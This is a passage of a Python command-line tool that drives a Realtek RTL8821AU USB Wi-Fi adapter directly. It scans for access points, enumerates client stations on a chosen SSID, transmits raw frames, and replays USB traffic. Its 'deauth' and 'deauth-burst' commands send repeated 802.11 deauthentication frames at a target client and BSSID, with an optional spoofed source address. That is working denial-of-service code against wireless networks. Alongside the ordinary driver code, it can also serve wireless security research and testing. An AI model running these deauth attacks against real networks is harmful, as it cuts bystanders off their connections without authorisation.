                    usb_spec = dev.read8(REG_USB_SPECIAL_OPTION)
                    rf_ctrl = dev.read8(REG_RF_CTRL)
                    rcr = dev.read32(REG_RCR)
                    print(f"[scan] CR16=0x{cr16:04x} CR32=0x{cr32:08x} TRXDMA=0x{trxdma:04x} USB_SPEC=0x{usb_spec:02x}")
                    print(f"[scan] RF_CTRL=0x{rf_ctrl:02x} RCR=0x{rcr:08x}")
                except Exception as e:
                    print(f"[scan] init reg snapshot failed: {e}")
                if args.ep_in is None:
                    try:
                        res = dev.autoselect_rx_altsetting(read_size=min(args.size, 4096), timeout_ms=200, trials=2)
                        if res:
                            print("[scan] altsetting probe:")
                            for r in res:
                                alt = int(r["alt"])
                                got = int(r["got"])
                                ins = ", ".join(f"0x{int(a):02x}" for a in r["bulk_in"])
                                outs = ", ".join(f"0x{int(a):02x}" for a in r["bulk_out"])
                                print(f"[scan]   alt={alt} bulk_in=[{ins}] bulk_out=[{outs}] got={got}")
                            print(f"[scan] selected alt={dev.altsetting}")
                    except Exception as e:
                        print(f"[scan] altsetting probe failed: {e}")

            results: dict[tuple[str, str], dict[str, object]] = {}
            total_urbs = 0
            total_bytes = 0
            total_pkts = 0
            total_mgmt = 0
            total_bcn = 0
            total_prb = 0
            dumped = 0
            for ch in channels:
                try:
                    dev.set_channel(ch, bandwidth_mhz=args.bw)
                except Exception:
                    continue
                end = time.monotonic() + (args.dwell_ms / 1000.0)
                ch_urbs = 0
                ch_bytes = 0
                ch_pkts = 0
                ch_mgmt = 0
                ch_bcn = 0
                ch_prb = 0
                ch_new = 0
                while time.monotonic() < end:
                    remain_ms = (end - time.monotonic()) * 1000.0
                    eff_timeout = int(min(args.timeout_ms, max(1.0, remain_ms)))

                    raws: list[bytes] = []
                    if args.ep_in is None and len(dev.bulk_in_eps) > 1:
                        for ep in dev.bulk_in_eps:
                            raw = dev.bulk_read(ep_addr=int(ep.bEndpointAddress), size=args.size, timeout_ms=eff_timeout)
                            if raw:
                                raws.append(raw)
                    else:
                        raw = dev.bulk_read(ep_addr=args.ep_in, size=args.size, timeout_ms=eff_timeout)
                        if raw:
                            raws.append(raw)

                    for raw in raws:
                        ch_urbs += 1
                        ch_bytes += len(raw)
                        for pkt in parse_rx_agg(raw):
                            ch_pkts += 1
                            if not args.scan_include_bad_fcs and (pkt.crc_err or pkt.icv_err):
                                continue
                            frame = pkt.frame
                            if not frame or _fc_version(frame) != 0:
                                if args.debug and args.scan_dump and dumped < int(args.scan_dump):
                                    head = (frame or b"")[:32]
                                    print(f"[scan] dump invalid v: {head.hex()}")
                                    dumped += 1
                                continue
                            a1, a2, a3, _a4, ftype, subtype, _seq = _parse_addrs(frame)
                            if ftype != 0 or subtype not in (5, 8) or a3 is None:
                                if args.debug and args.scan_dump and dumped < int(args.scan_dump):
                                    fc = int.from_bytes(frame[0:2], "little") if len(frame) >= 2 else 0
                                    head = frame[:32]
                                    print(f"[scan] dump fc=0x{fc:04x} ftype={ftype} subtype={subtype} head={head.hex()}")
                                    dumped += 1
                                continue
                            ch_mgmt += 1
                            if subtype == 8:
                                ch_bcn += 1
                            elif subtype == 5:
                                ch_prb += 1
                            ssid, ch_ie = _extract_mgmt_ssid_and_channel(frame)
                            if ssid is None:
                                continue
                            bssid = _fmt_mac(a3)
                            ch_eff = int(ch)
                            if ch_ie is not None:
                                try:
                                    ch_ie_i = int(ch_ie)
                                except Exception:
                                    ch_ie_i = -1
                                if ch_ie_i in channels_set:
                                    ch_eff = ch_ie_i
                            key = (bssid, ssid)
                            prev = results.get(key)
                            if prev is None:
                                results[key] = {"bssid": bssid, "ssid": ssid, "channel": ch_eff, "seen": 1}
                                ch_new += 1
                            else:
                                prev["seen"] = int(prev["seen"]) + 1

                total_urbs += ch_urbs
                total_bytes += ch_bytes
                total_pkts += ch_pkts
                total_mgmt += ch_mgmt
                total_bcn += ch_bcn
                total_prb += ch_prb
                if args.debug:
                    print(
                        f"[scan] ch={int(ch):03d} urbs={ch_urbs} bytes={ch_bytes} pkts={ch_pkts}"
                        f" mgmt={ch_mgmt} bcn={ch_bcn} prb={ch_prb} new={ch_new}"
                    )

            rows = list(results.values())
            if args.target_ssid:
                target = str(args.target_ssid).strip()
                rows = [r for r in rows if str(r["ssid"]).strip() == target]
            rows.sort(key=lambda r: (int(r["channel"]), str(r["ssid"])))
            if args.debug:
                print(
                    f"[scan] total urbs={total_urbs} bytes={total_bytes} pkts={total_pkts}"
                    f" mgmt={total_mgmt} bcn={total_bcn} prb={total_prb} nets={len(rows)}"
                )
            for r in rows:
                ssid = str(r["ssid"])
                if ssid == "":
                    ssid = "<hidden>"
                print(f"ch={int(r['channel']):02d} bssid={r['bssid']} seen={int(r['seen'])} ssid={ssid}")

            if args.target_ssid and rows:
                if not args.no_sitesurvey_filters:
                    try:
                        dev.set_sitesurvey_filters(False)
                    except Exception:
                        pass
                for r in rows:
                    bssid_s = str(r["bssid"])
                    channel = int(r["channel"])
                    ssid = str(r["ssid"]) or "<hidden>"
                    print(f"Scanning stations for SSID='{ssid}' BSSID={bssid_s} on channel {channel}...")
                    dev.set_channel(channel, bandwidth_mhz=20)
                    end = time.monotonic() + (int(args.station_scan_ms) / 1000.0)
                    stations: dict[str, dict[str, object]] = {}
                    st_pkts = 0
                    st_data = 0
                    st_mgmt = 0
                    st_match = 0
                    st_dumped = 0
                    while time.monotonic() < end:
                        remain_ms = (end - time.monotonic()) * 1000.0
                        eff_timeout = int(min(args.timeout_ms, max(1.0, remain_ms)))
                        raws: list[bytes] = []
                        if args.ep_in is None and len(dev.bulk_in_eps) > 1:
                            for ep in dev.bulk_in_eps:
                                raw = dev.bulk_read(
                                    ep_addr=int(ep.bEndpointAddress), size=args.size, timeout_ms=eff_timeout
                                )
                                if raw:
                                    raws.append(raw)
                        else:
                            raw = dev.bulk_read(ep_addr=args.ep_in, size=args.size, timeout_ms=eff_timeout)
                            if raw:
                                raws.append(raw)

                        for raw in raws:
                            for pkt in parse_rx_agg(raw):
                                st_pkts += 1
                                if not args.scan_include_bad_fcs and (pkt.crc_err or pkt.icv_err):
                                    continue
                                frame = pkt.frame
                                if not frame or _fc_version(frame) != 0:
                                    continue
                                a1, a2, a3, _a4, ftype, subtype, _seq = _parse_addrs(frame)
                                sta_mac: Optional[str] = None
                                frame_bssid: Optional[str] = None
                                if ftype == 2:
                                    st_data += 1
                                    fc = int.from_bytes(frame[0:2], "little")
                                    to_ds = bool((fc >> 8) & 0x1)
                                    from_ds = bool((fc >> 9) & 0x1)
                                    if to_ds and not from_ds:
                                        if a1 is not None and a2 is not None and _is_unicast_mac(a1) and _is_unicast_mac(a2) and a1 != a2:
                                            frame_bssid = _fmt_mac(a1)
                                            sta_mac = _fmt_mac(a2)
                                    elif from_ds and not to_ds:
                                        if a1 is not None and a2 is not None and _is_unicast_mac(a2) and _is_unicast_mac(a1) and a1 != a2:
                                            frame_bssid = _fmt_mac(a2)
                                            sta_mac = _fmt_mac(a1)
                                elif ftype == 1 and subtype in (8, 9, 10, 11):
                                    if len(frame) >= 16:
                                        ra = frame[4:10]
                                        ta = frame[10:16]
                                        ra_s = _fmt_mac(ra) if _is_unicast_mac(ra) else None
                                        ta_s = _fmt_mac(ta) if _is_unicast_mac(ta) else None
                                        if ra_s == bssid_s and ta_s is not None:
                                            frame_bssid = ra_s
                                            sta_mac = ta_s
                                        elif ta_s == bssid_s and ra_s is not None:
                                            frame_bssid = ta_s
                                            sta_mac = ra_s
                                elif ftype == 0:
                                    st_mgmt += 1
                                    a1_s = _fmt_mac(a1) if a1 is not None and _is_unicast_mac(a1) else None
                                    a2_s = _fmt_mac(a2) if a2 is not None and _is_unicast_mac(a2) else None
                                    a3_s = _fmt_mac(a3) if a3 is not None and _is_unicast_mac(a3) else None
                                    if a3_s == bssid_s:
                                        frame_bssid = a3_s
                                        if a2_s is not None and a2_s != bssid_s:
                                            sta_mac = a2_s
                                        elif a1_s is not None and a1_s != bssid_s:
                                            sta_mac = a1_s
                                else:
                                    continue
                                if frame_bssid != bssid_s or sta_mac is None or sta_mac == bssid_s:
                                    if args.debug and args.scan_dump and st_dumped < int(args.scan_dump):
                                        fc = int.from_bytes(frame[0:2], "little") if len(frame) >= 2 else 0
                                        head = frame[:32]
                                        print(
                                            f"[sta] dump fc=0x{fc:04x} ftype={ftype} subtype={subtype}"
                                            f" a1={_fmt_mac(a1) if a1 else None}"
                                            f" a2={_fmt_mac(a2) if a2 else None}"
                                            f" a3={_fmt_mac(a3) if a3 else None}"
                                            f" head={head.hex()}"
                                        )
                                        st_dumped += 1
                                    continue
                                st_match += 1
                                prev = stations.get(sta_mac)
                                if prev is None:
                                    stations[sta_mac] = {"mac": sta_mac, "seen": 1}
                                else:
                                    prev["seen"] = int(prev["seen"]) + 1

                    if args.debug:
                        print(
                            f"[sta] pkts={st_pkts} data={st_data} mgmt={st_mgmt} matched={st_match} stations={len(stations)}"
                        )
                    for sta in sorted(stations.values(), key=lambda x: (-int(x["seen"]), str(x["mac"]))):
                        print(f"  Station: {sta['mac']} seen={int(sta['seen'])}")

            if not args.no_sitesurvey_filters:
                try:
                    dev.set_sitesurvey_filters(False)
                except Exception:
                    pass
            return 0

        if args.cmd == "led":
            fw_path: Optional[Path] = Path(args.fw_path) if args.fw_path is not None else None
            if fw_path is None and not args.init_mac:
                fw_path = _autodetect_fw_path()

            if fw_path is not None:
                with open(fw_path, "rb") as f:
                    fw_bytes = f.read()
                if not args.no_power_on:
                    dev.power_on_8821a_usb(debug=args.fw_debug)
                dev.download_firmware(fw_bytes, debug=args.fw_debug, retries=args.fw_retries)
                dev.hw_init_8821au()
            elif args.init_mac:
                dev.init_mac_rx_tx()

            try:
                dev.led_set(False, reg=args.reg)
            except Exception:
                pass
            dev.led_blink(count=args.count, on_ms=args.on_ms, off_ms=args.off_ms, reg=args.reg)
            return 0

        if args.cmd == "tx":
            fw_path: Optional[Path] = Path(args.fw_path) if args.fw_path is not None else None
            if fw_path is None and not args.init_mac:
                fw_path = _autodetect_fw_path()

            if fw_path is not None:
                with open(fw_path, "rb") as f:
                    fw_bytes = f.read()
                if not args.no_power_on:
                    dev.power_on_8821a_usb(debug=args.fw_debug)
                dev.download_firmware(fw_bytes, debug=args.fw_debug, retries=args.fw_retries)
                dev.hw_init_8821au()
            elif args.init_mac:
                dev.init_mac_rx_tx()

            dev.set_monitor_mode()
            dev._init_burst_pkt_len_8821u()
            dev.enable_mac_tx_rx()
            dev.set_channel(args.channel, bandwidth_mhz=args.bw)

            frame = _hex_to_bytes(args.hexframe)
            frame, _ = _strip_fcs_if_present(frame)
            n = dev.tx_frame(frame, ep_addr=args.ep_out)
            print(n)
            return 0

        if args.cmd == "deauth":
            fw_path: Optional[Path] = Path(args.fw_path) if args.fw_path is not None else None
            if fw_path is None and not args.init_mac:
                fw_path = _autodetect_fw_path()

            if fw_path is not None:
                with open(fw_path, "rb") as f:
                    fw_bytes = f.read()
                if not args.no_power_on:
                    dev.power_on_8821a_usb(debug=args.fw_debug)
                dev.download_firmware(fw_bytes, debug=args.fw_debug, retries=args.fw_retries)
                dev.hw_init_8821au()
            elif args.init_mac:
                dev.init_mac_rx_tx()

            dev.set_monitor_mode()
            dev._init_burst_pkt_len_8821u()
            dev.enable_mac_tx_rx()
            dev.set_channel(args.channel, bandwidth_mhz=args.bw)

            sent = 0
            for i in range(int(args.count)):
                dev.send_deauth(
                    dest=str(args.target_mac),
                    bssid=str(args.bssid),
                    source=str(args.source_mac) if args.source_mac is not None else None,
                    reason=int(args.reason),
                    ep_out=args.ep_out,
                )
                sent += 1
                if i + 1 < int(args.count):
                    time.sleep(float(args.delay_ms) / 1000.0)
            print(sent)
            return 0

        if args.cmd == "deauth-burst":
            replay_pcap = _resolve_replay_pcap(getattr(args, "replay_pcap", None))
            if replay_pcap is None:
                fw_path: Optional[Path] = Path(args.fw_path) if args.fw_path is not None else None
                if fw_path is None and not args.init_mac:
                    fw_path = _autodetect_fw_path()

                if fw_path is not None:
                    with open(fw_path, "rb") as f:
                        fw_bytes = f.read()
                    if not args.no_power_on:
                        dev.power_on_8821a_usb(debug=args.fw_debug)
                    dev.download_firmware(fw_bytes, debug=args.fw_debug, retries=args.fw_retries)
                    dev.hw_init_8821au()
                elif args.init_mac:
                    dev.init_mac_rx_tx()
            elif args.init_mac:
                dev.init_mac_rx_tx()

            if replay_pcap is not None:
                if args.replay_mode == "all":
                    default_filter = "usb.urb_type=='S' || usb.urb_type=='C'"
                    display_filter = args.replay_filter or default_filter
                    dev.replay_all_usb_requests_from_pcap(
                        replay_pcap,
                        display_filter=display_filter,
                        timeout_ms=int(args.replay_timeout_ms),
                        bulk_in_default_size=int(args.replay_bulk_in_default_size),
                        sleep=bool(args.replay_sleep),
                        max_sleep_ms=int(args.replay_max_sleep_ms),
                        dry_run=False,
                        limit=0,
                        debug=False,
                        verify_in=not bool(args.replay_no_verify_in),
                        verify_in_mode=("len" if bool(args.replay_verify_in_len) else "bytes"),
                        only_rtw_vendor_req=bool(args.replay_only_rtw_vendor_req),
                        report_mismatch=int(args.replay_report_mismatch),
                        report_errors=int(args.replay_report_errors),
                    )
                else:
                    default_filter = "usb.urb_type=='S' && (usb.bmRequestType==0x40 || usb.bmRequestType==0xc0) && usb.setup.bRequest==5"
                    display_filter = args.replay_filter or default_filter
                    dev.replay_vendor_requests_from_pcap(
                        replay_pcap,
                        display_filter=display_filter,
                        debug=False,
                        sleep=bool(args.replay_sleep),
                        max_sleep_ms=int(args.replay_max_sleep_ms),
                        verify_delay_ms=0.0,
                    )

            dev.set_monitor_mode()
            dev._init_burst_pkt_len_8821u()
            dev.enable_mac_tx_rx()
            dev.set_channel(args.channel, bandwidth_mhz=args.bw)

            fp = sys.stdout.buffer if args.pcap == "-" else open(args.pcap, "wb")
            try:
                pcap = PcapWriter(fp)
                sent = 0
                written = 0
                try:
                    sent, written = dev.deauth_burst_capture_pcap(
                        pcap=pcap,
                        dest=str(args.target_mac),
                        bssid=str(args.bssid),
                        source=str(args.source_mac) if args.source_mac is not None else None,
                        reason=int(args.reason),
                        burst_size=int(args.burst_size),
                        interval_ms=int(args.burst_interval_ms),
                        duration_s=float(args.burst_duration_s),
                        ep_in=args.ep_in,
                        ep_out=args.ep_out,
                        channel=int(args.channel),
                        read_size=int(args.read_size),
                        timeout_ms=int(args.burst_read_timeout_ms),
                        include_bad_fcs=bool(args.pcap_include_bad_fcs),
                        keep_fcs=bool(args.pcap_with_fcs),
                    )
                except KeyboardInterrupt:
                    pass
                pcap.flush()
            finally:
                if args.pcap != "-":
                    fp.close()
            print(f"sent={sent} pcap_written={written}")
            return 0

        if args.cmd == "replay":
            stats = dev.replay_all_usb_requests_from_pcap(
                args.pcap,
                display_filter=args.filter,
                timeout_ms=args.timeout_ms,
                bulk_in_default_size=args.bulk_in_default_size,
                sleep=args.sleep,
                max_sleep_ms=args.max_sleep_ms,
                dry_run=args.dry_run,
                limit=args.limit,
                debug=args.debug,
                verify_in=not args.no_verify_in,
                verify_in_mode=("len" if args.verify_in_len else "bytes"),
                only_rtw_vendor_req=bool(args.only_rtw_vendor_req),
                report_mismatch=int(args.report_mismatch),
                report_errors=int(args.report_errors),
            )
            print(stats)
            return 0

        return 2
    finally:
        dev.close()


@dataclass(frozen=True)
class _PcapUsbRecord:
    frame_no: int
    time_rel: float
    transfer_type: int
    urb_type: str
    urb_id: str
    endpoint_address: int
    urb_len: int
    data_len: int
    capdata_hex: str
    bm_request_type: Optional[int]
    b_request: Optional[int]
    w_value: Optional[int]
    w_index: Optional[int]
    w_length: Optional[int]
    data_fragment_hex: str
    control_response_hex: str


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
